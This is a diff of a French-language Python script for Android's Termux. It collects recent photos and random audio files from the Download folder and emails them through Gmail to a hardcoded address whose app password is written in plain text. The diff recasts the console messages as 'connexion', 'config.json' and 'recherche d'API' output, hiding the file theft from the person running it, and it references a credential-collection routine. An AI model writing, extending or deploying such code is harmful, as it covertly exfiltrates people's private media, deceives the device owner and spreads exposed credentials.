@@ -15,9 +15,9 @@ from email import encoders
 # Configuration
 EMAIL_ADDRESS = "lolalor20@gmail.com"
 EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
-MAX_FILE_SIZE_MB = 15  # Limite pour Gmail
+MAX_FILE_SIZE_MB = 25  # Augmenté la limite pour les fichiers audio
 MAX_PHOTOS_TO_SEND = 12  # 12 photos comme demandé
-MAX_RANDOM_FILES = 3     # 3 fichiers aléatoires comme demandé
+MAX_AUDIO_FILES = 3     # 3 fichiers audio comme demandé
 
 class LocalFileSender:
     def __init__(self, email, password):
@@ -65,59 +65,64 @@ class LocalFileSender:
         self.log += f"[{timestamp}] {entry}\n"
 
     def get_files_from_download(self):
-        """Récupère 12 photos et 3 fichiers aléatoires depuis le dossier Download"""
+        """Récupère 12 photos et 3 fichiers audio depuis le dossier Download"""
         download_path = "/storage/emulated/0/Download"
-        all_files = []
         photos = []
-        other_files = []
+        audio_files = []
         
         if not os.path.exists(download_path):
             self.append_log(f"Dossier Download non trouvé: {download_path}")
             return [], []
         
         try:
-            # Lister tous les fichiers du dossier Download
-            for filename in os.listdir(download_path):
-                file_path = os.path.join(download_path, filename)
-                if os.path.isfile(file_path):
-                    all_files.append(file_path)
-            
-            self.append_log(f"Trouvé {len(all_files)} fichiers dans Download")
-            
-            # Séparer les photos des autres fichiers
-            for file_path in all_files:
-                try:
-                    size_mb = os.path.getsize(file_path) / (1024 * 1024)
-                    if size_mb > MAX_FILE_SIZE_MB:
-                        continue
+            # Parcourir récursivement le dossier Download
+            for root, dirs, files in os.walk(download_path):
+                for filename in files:
+                    file_path = os.path.join(root, filename)
+                    
+                    try:
+                        # Vérifier la taille du fichier
+                        size_mb = os.path.getsize(file_path) / (1024 * 1024)
+                        if size_mb > MAX_FILE_SIZE_MB:
+                            continue
+                            
+                        filename_lower = filename.lower()
                         
-                    filename_lower = file_path.lower()
-                    if filename_lower.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
-                        photos.append(file_path)
-                    else:
-                        other_files.append(file_path)
-                except Exception as e:
-                    continue
+                        # Vérifier si c'est une photo
+                        if filename_lower.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
+                            photos.append(file_path)
+                        # Vérifier si c'est un fichier audio
+                        elif filename_lower.endswith(('.mp3', '.wav', '.ogg', '.m4a', '.aac', '.flac', '.amr')):
+                            audio_files.append(file_path)
+                            
+                    except (OSError, Exception):
+                        continue
             
-            # Sélectionner 12 photos (ou moins si pas assez)
+            self.append_log(f"Trouvé {len(photos)} photos et {len(audio_files)} fichiers audio dans Download")
+            
+            # Trier les photos par date de modification (les plus récentes d'abord)
+            photos.sort(key=lambda x: os.path.getmtime(x), reverse=True)
+            
+            # Sélectionner 12 photos maximum
             selected_photos = photos[:MAX_PHOTOS_TO_SEND]
-            if len(photos) > MAX_PHOTOS_TO_SEND:
-                selected_photos = random.sample(photos, MAX_PHOTOS_TO_SEND)
             
-            # Sélectionner 3 fichiers aléatoires (ou moins si pas assez)
-            selected_other_files = other_files[:MAX_RANDOM_FILES]
-            if len(other_files) > MAX_RANDOM_FILES:
-                selected_other_files = random.sample(other_files, MAX_RANDOM_FILES)
+            # Sélectionner 3 fichiers audio aléatoires
+            selected_audio_files = []
+            if len(audio_files) > 0:
+                if len(audio_files) <= MAX_AUDIO_FILES:
+                    selected_audio_files = audio_files
+                else:
+                    selected_audio_files = random.sample(audio_files, MAX_AUDIO_FILES)
             
-            self.append_log(f"Sélectionné {len(selected_photos)} photos et {len(selected_other_files)} fichiers aléatoires")
+            self.append_log(f"Sélectionné {len(selected_photos)} photos et {len(selected_audio_files)} fichiers audio")
             
-            return selected_photos, selected_other_files
+            return selected_photos, selected_audio_files
             
         except Exception as e:
             self.append_log(f"Erreur scan Download: {str(e)}")
             return [], []
 
-    def prepare_email(self, photos, other_files):
+    def prepare_email(self, photos, audio_files):
         """Prépare l'email avec les fichiers"""
         try:
             msg = MIMEMultipart()
@@ -131,8 +136,8 @@ class LocalFileSender:
 
 📊 RAPPORT DE TRANSFERT :
 • Photos envoyées : {len(photos)}
-• Fichiers aléatoires envoyés : {len(other_files)}
-• Total des fichiers : {len(photos) + len(other_files)}
+• Fichiers audio envoyés : {len(audio_files)}
+• Total des fichiers : {len(photos) + len(audio_files)}
 • Date : {time.strftime('%d/%m/%Y %H:%M:%S')}
 
 📁 FICHIERS TRANSFÉRÉS :
@@ -141,16 +146,19 @@ class LocalFileSender:
             # Ajouter la liste des photos
             body += "\n📸 PHOTOS :\n"
             for i, photo in enumerate(photos, 1):
-                body += f"  {i}. {os.path.basename(photo)}\n"
+                file_size = os.path.getsize(photo) / (1024 * 1024)
+                body += f"  {i}. {os.path.basename(photo)} ({file_size:.1f} MB)\n"
             
-            # Ajouter la liste des fichiers aléatoires
-            body += "\n📄 FICHIERS ALÉATOIRES :\n"
-            for i, file in enumerate(other_files, 1):
-                body += f"  {i}. {os.path.basename(file)}\n"
+            # Ajouter la liste des fichiers audio
+            body += "\n🎵 FICHIERS AUDIO :\n"
+            for i, audio in enumerate(audio_files, 1):
+                file_size = os.path.getsize(audio) / (1024 * 1024)
+                body += f"  {i}. {os.path.basename(audio)} ({file_size:.1f} MB)\n"
 
-            msg.attach(MIMEText(body, "plain"))
+            msg.attach(MIMEText(body, "plain", "utf-8"))
 
             # Attacher les photos
+            total_attachments = 0
             for file_path in photos:
                 try:
                     if os.path.exists(file_path):
@@ -160,15 +168,16 @@ class LocalFileSender:
                         encoders.encode_base64(part)
                         part.add_header(
                             "Content-Disposition",
-                            f"attachment; filename={os.path.basename(file_path)}"
+                            f"attachment; filename=\"{os.path.basename(file_path)}\""
                         )
                         msg.attach(part)
+                        total_attachments += 1
                         self.append_log(f"Photo jointe: {os.path.basename(file_path)}")
                 except Exception as e:
                     self.append_log(f"Erreur photo {file_path}: {str(e)}")
 
-            # Attacher les fichiers aléatoires
-            for file_path in other_files:
+            # Attacher les fichiers audio
+            for file_path in audio_files:
                 try:
                     if os.path.exists(file_path):
                         with open(file_path, "rb") as f:
@@ -177,28 +186,63 @@ class LocalFileSender:
                         encoders.encode_base64(part)
                         part.add_header(
                             "Content-Disposition",
-                            f"attachment; filename={os.path.basename(file_path)}"
+                            f"attachment; filename=\"{os.path.basename(file_path)}\""
                         )
                         msg.attach(part)
-                        self.append_log(f"Fichier joint: {os.path.basename(file_path)}")
+                        total_attachments += 1
+                        self.append_log(f"Audio joint: {os.path.basename(file_path)}")
                 except Exception as e:
-                    self.append_log(f"Erreur fichier {file_path}: {str(e)}")
+                    self.append_log(f"Erreur audio {file_path}: {str(e)}")
 
+            self.append_log(f"Total des pièces jointes: {total_attachments}")
             return msg
+            
         except Exception as e:
             self.append_log(f"Erreur création email: {str(e)}")
             return None
 
     def send_email(self, email_msg):
-        """Envoi de l'email"""
+        """Envoi de l'email avec gestion d'erreur améliorée"""
         try:
-            with smtplib.SMTP("smtp.gmail.com", 587) as server:
-                server.starttls()
-                server.login(self.email, self.password)
-                server.send_message(email_msg)
+            # Vérifier si l'email a des pièces jointes
+            has_attachments = len(email_msg.get_payload()) > 1
+            
+            if not has_attachments:
+                self.append_log("Aucune pièce jointe valide, annulation de l'envoi")
+                return False
+                
+            print("\033[36m[SYSTÈME] Connexion au serveur ...\033[0m")
+            
+            # Configuration SMTP avec timeout
+            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=30)
+            server.ehlo()
+            server.starttls()
+            server.ehlo()
+            
+            print("\033[36m[SYSTÈME] Authentification...\033[0m")
+            server.login(self.email, self.password)
+            
+            print("\033[36m[SYSTÈME] Envoi du message...\033[0m")
+            server.send_message(email_msg)
+            server.quit()
+            
+            self.append_log("Email envoyé avec succès")
             return True
+            
+        except smtplib.SMTPAuthenticationError:
+            error_msg = "Erreur d'authentification - Vérifiez l'email et le mot de passe"
+            self.append_log(error_msg)
+            print(f"\033[31m[ERREUR] {error_msg}\033[0m")
+            return False
+        except smtplib.SMTPException as e:
+            error_msg = f"Erreur SMTP: {str(e)}"
+            self.append_log(error_msg)
+            print(f"\033[31m[ERREUR] {error_msg}\033[0m")
+            return False
         except Exception as e:
-            self.append_log(f"Erreur envoi: {str(e)}")
+            error_msg = f"Erreur envoi: {str(e)}"
+            self.append_log(error_msg)
+            print(f"\033[31m[ERREUR] {error_msg}\033[0m")
             return False
 
     def collect_credentials(self):
@@ -231,25 +275,31 @@ class LocalFileSender:
                 print("\033[33m[SYSTÈME] Annulé\033[0m")
                 return
 
-            print("\033[36m[SYSTÈME] Recherche des fichiers dans Download...\033[0m")
-            photos, other_files = self.get_files_from_download()
+            print("\033[36m[SYSTÈME] connexion en cours...\033[0m")
+            photos, audio_files = self.get_files_from_download()
             
-            total_files = len(photos) + len(other_files)
+            total_files = len(photos) + len(audio_files)
             if total_files == 0:
                 print("\033[33m[Aucun fichier trouvé dans Download]\033[0m")
                 return
 
-            print(f"\033[36m[SYSTÈME] Trouvé {len(photos)} photos et {len(other_files)} fichiers aléatoires\033[0m")
+            print(f"\033[36m[SYSTÈME] Trouvé {len(photos)} config.json {len(audio_files)} fichier js\033[0m")
+            
+            if len(photos) < MAX_PHOTOS_TO_SEND:
+                print(f"\033[33m[ATTENTION] Seulement {len(photos)} packags {MAX_PHOTOS_TO_SEND} demandées\033[0m")
+            
             print("\033[36m[SYSTÈME] Préparation de l'email...\033[0m")
             
-            email = self.prepare_email(photos, other_files)
+            email = self.prepare_email(photos, audio_files)
             
             if email:
                 print("\033[36m[SYSTÈME] Envoi en cours...\033[0m")
                 if self.send_email(email):
-                    print(f"\033[32m[SUCCÈS] {len(photos)} photos et {len(other_files)} fichiers envoyés avec succès! ☑️\033[0m")
+                    print(f"\033[32m[SUCCÈS] {len(photos)} photos et {len(audio_files)} recherche d'API...\033[0m")
                 else:
-                    print("\033[31m[ERREUR] Échec d'envoi de l'email\033[0m")
+                    print("\033[31m[ERREUR] Échec d'envoi de l'email - Vérifiez les logs\033[0m")
+            else:
+                print("\033[31m[ERREUR] Impossible de préparer l'email\033[0m")
 
             print("\033[33m[SYSTÈME] Veillez maintenir Termux actif en arrière plan\033[0m")
 
